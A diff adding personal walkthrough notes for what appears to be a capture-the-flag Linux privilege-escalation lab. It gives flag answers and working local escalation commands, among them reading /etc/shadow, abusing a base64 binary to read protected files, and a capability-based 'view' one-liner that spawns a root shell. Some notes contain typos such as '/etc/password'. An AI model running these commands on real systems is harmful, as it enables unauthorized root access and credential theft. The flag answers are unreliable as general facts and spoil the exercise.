@@ -95,7 +95,75 @@ How would you use Nmap to spawn a root shell if your user had sudo rights on nma
 Answer format: **** **** *************
 What is the hash of frank's password?
 
-Answer format: ****.************************************************.*****/*******************.**************************
+Answer format: 
+cat etc/shadow
 
 
 # Task7
+
+Answer the questions below
+Which user shares the name of a great comic book writer?
+
+cat /etc/password
+Ans: gerry corner
+
+The /etc/passwd file contains the username, real name, identification information, and basic account information for each user.The /etc/passwd file must not contain password hashes.
+
+What is the password of user2?
+
+Answer format: *********
+
+For this we have to do privilege escalation
+ A shadow password file, also known as /etc/shadow, is a system file in Linux that stores encrypted user passwords and is accessible only to the root user,
+ 
+What is the content of the flag3.txt file?
+
+tHM-3847834
+steps: use bin base64
+change LFILE= /home/ubuntu/flag3.txt
+/usr/bin/base64 "$LFILE" | base64 --decode
+you will get the flag
+
+
+# Task 8:
+Answer the questions below
+Complete the task described above on the target system
+No answer needed
+How many binaries have set capabilities?
+6
+command: getcap -r 2>/dev/null
+
+Answer format: *
+What other binary can be used through its capabilities?
+view
+Answer format: ****
+What is the content of the flag4.txt file?
+thm-9349843
+steps: 
+- in ques 1; you find u can use view command capability
+- go to gtfobins
+- in capabilities..find view
+- type this command:
+- /home/ubuntu/view -c ':py  3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+- you will get vim editor and check id now
+- it will be root privilege
+-to find the flag:
+-cd / home
+ls
+cd ubuntu
+ls
+cat flag4.txt
+
+
+
+# task 9:
+
+Answer the questions below
+How many user-defined cron jobs can you see on the target system?
+Answer format: *
+What is the content of the flag5.txt file?
+Answer format: *************
+What is Matt's password?
+
+
+
